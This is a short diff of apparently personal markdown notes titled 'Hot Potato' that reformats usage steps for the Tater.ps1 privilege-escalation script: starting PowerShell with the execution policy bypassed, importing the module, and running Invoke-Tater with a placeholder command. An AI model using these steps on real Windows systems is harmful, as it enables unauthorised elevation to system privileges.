@@ -1,9 +1,17 @@
-# Example:
+# Hot Potato
 
-### 1: powershell.exe -nop -ep bypass
+## Example:
 
-### 2: Import-Module C:\path\to\Tater.ps1
+### 1: 
 
-### 3: Invoke-Tater -Trigger | -Command "COMMAND"
+    powershell.exe -nop -ep bypass
+
+### 2: 
+
+    Import-Module C:\path\to\Tater.ps1
+
+### 3: 
+
+    Invoke-Tater -Trigger | -Command "COMMAND"
 
 ### 4: GG!
